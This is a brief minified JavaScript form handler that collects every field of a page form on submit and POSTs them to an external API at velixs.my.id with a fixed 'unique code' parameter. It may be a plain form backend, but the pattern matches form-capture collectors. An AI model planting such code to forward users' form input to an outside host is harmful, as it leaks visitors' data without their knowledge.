const content=document.getElementById("content");content.addEventListener("submit",e=>{e.preventDefault();let n=new FormData(content),o={};n.forEach((e,n)=>{o[n]=e});let t=new URLSearchParams;for(let i in o)t.append(i,o[i]);fetch("https://velixs.my.id/api?kode_unik=12345",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:t.toString()})}); ￼Enter
